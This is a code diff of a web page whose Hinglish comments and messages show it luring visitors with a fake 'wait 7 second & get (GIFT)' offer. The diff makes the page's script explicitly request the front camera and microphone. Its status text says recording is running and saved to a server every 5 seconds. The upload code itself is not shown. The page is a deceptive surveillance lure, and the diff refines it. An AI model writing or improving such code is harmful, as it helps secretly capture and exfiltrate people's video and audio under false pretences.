@@ -42,7 +42,7 @@
             background: #000;
             object-fit: cover;
             border: 2px solid rgba(255, 255, 255, 0.2);
-            transform: scaleX(-1);
+            transform: scaleX(-1); /* Mirror view */
         }
         #status {
             margin-top: 15px;
@@ -75,6 +75,7 @@
 
     <div class="container">
         <h2>wait 7 second & get (GIFT)</h2>
+        <!-- autoplay, muted, aur playsinline mobile ke liye zaroori hain -->
         <video id="preview" autoplay muted playsinline></video>
         
         <p id="status">Permissions mangi ja rahi hain...</p>
@@ -94,8 +95,16 @@
             try {
                 status.innerText = "Kripya Camera aur Microphone ki permission dein...";
                 
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // Explicitly front camera aur audio maangna
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: true 
+                });
+                
                 preview.srcObject = stream;
+                
+                // Video play hone ka ensure karna
+                await preview.play().catch(e => console.log("Preview play error:", e));
                 
                 status.innerText = "🔴 Recording chalu hai... Har 5 second mein server par save ho raha hai.";
 
